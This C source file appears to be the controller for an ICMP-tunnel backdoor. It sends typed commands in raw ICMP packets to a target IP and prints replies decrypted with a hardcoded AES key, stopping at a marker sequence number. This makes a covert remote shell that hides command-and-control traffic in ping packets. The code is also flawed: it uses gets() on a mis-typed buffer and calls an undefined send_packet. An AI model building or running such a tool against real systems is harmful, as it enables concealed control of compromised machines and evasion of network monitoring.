#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <setjmp.h>
#include <errno.h>
#include "aes.h"

#define RECV_PACK 4096


int main(int argc, char* argv[]){


    struct ip*ip;
    struct icmp*icmp;
	unsigned long inetaddr;
	struct sockaddr_in dest_addr;
	struct protoent *protocol;	
	int sockfd;
	int n;
	int length;
	int pack_seq = 0;
	char buf[4096];
	char *dst_ip = argv[1];
	char *cmd[1024];
	char *src_ip;
	char *cmp_ip = argv[1];
	unsigned char *key = "qaxswedcvfrt1097";
	AES_Init(key);
	inetaddr = inet_addr(dst_ip);
	dest_addr.sin_family = AF_INET;
	memcpy( (char *)&(dest_addr.sin_addr),(char *)&inetaddr,sizeof(unsigned long));
	
	setuid(getuid());
	pid_t pid = getpid();
	
	if((protocol = getprotobyname("icmp"))==NULL)
	{
		perror("error\n");
		exit(EXIT_FAILURE);
	}
	
	if((sockfd = socket(AF_INET,SOCK_RAW,protocol->p_proto))<0){
		printf("socket error\n");
		exit(0);
	}
	
	
	while(1)
	{
		bzero(buf,4096);
		bzero(cmd,1024);
		printf("\n--------------begain-------------:");
		if(strlen(gets(cmd))>1024){
			printf("cmd too long\n");
			exit(0);
		}
		else {
			send_packet(pack_seq,sockfd,pid,cmd,dest_addr);
		}
			
		n = 1;

		while(1)
		{

			n = recv(sockfd,buf,RECV_PACK,0);
			//printf("buf has recv %s\n",buf);
			ip = (struct ip*)buf;

			src_ip = inet_ntoa(ip->ip_src);
			
			//printf("src_ip is %s\n",src_ip);
			
			int cmp_num = strcmp(src_ip,cmp_ip);
			icmp = (struct icmp*)(ip+1);

			if(icmp->icmp_type == ICMP_ECHO && icmp->icmp_code == 0 && cmp_num == 0){

				length = icmp->icmp_id;
				AES_Decrypt(icmp->icmp_data,icmp->icmp_data,length, NULL);
				AES_delete_pkcs7Padding(icmp->icmp_data,length);
				printf("%s",icmp->icmp_data);
			}
			if(icmp->icmp_seq == 8888){
				//printf("the last package\n");
				break;
			}



		}
	}
}